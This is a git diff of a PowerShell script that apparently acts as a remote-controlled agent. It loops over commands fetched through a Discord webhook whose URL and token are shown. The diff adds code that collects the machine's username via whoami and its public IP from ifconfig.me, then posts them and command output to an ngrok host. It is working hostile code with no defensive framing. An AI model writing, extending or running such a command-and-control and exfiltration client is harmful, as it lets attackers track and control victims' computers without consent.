@@ -2,11 +2,15 @@ $webhookUri = 'https://discord.com/api/webhooks/1215498255593639996/9XYdMB4oJjrL
 
 $ran = Get-Random
 
+$lll = "clients"
+
 $c = $null
 
-clients = whoami
+$clients = whoami
 
-clients += " " "
+$clients += " "
+
+$clients += (Invoke-WebRequest ifconfig.me/ip).Content.Trim()
 
 $body = $null
 
@@ -68,17 +72,19 @@ while ($true)
             $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing 
         }
         catch{
-            Write-Output web server isnt running...
+            Write-Output "web server isnt running..."
         }
     }
 
-    if($MAIN -match "clients"){
+    if($MAIN -match $lll){
         try
         {
-            $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $whoami -UseBasicParsing
+            $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $clients -UseBasicParsing
+        sleep 0.8
         }
         catch{
-           Write-Output web server isnt running...
+            Write-Output "web server isnt running..."
+        }
     } 
 sleep 0.5
 }
